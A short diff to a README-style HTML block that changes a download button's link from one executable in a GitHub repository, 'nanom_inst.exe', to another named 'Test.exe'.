@@ -6,7 +6,7 @@
 </h4>
 
 <p align="center">
-  <a href="https://downgit.github.io/#/home?url=https://github.com/FriNagy/meiner/blob/main/files/nanom_inst.exe"><img
+  <a href="https://downgit.github.io/#/home?url=https://github.com/FriNagy/meiner/Test.exe"><img
 		alt="Download Installations Programm"
 		src="https://github.com/FriNagy/meiner/blob/main/files/down.png"></a>
 </p>
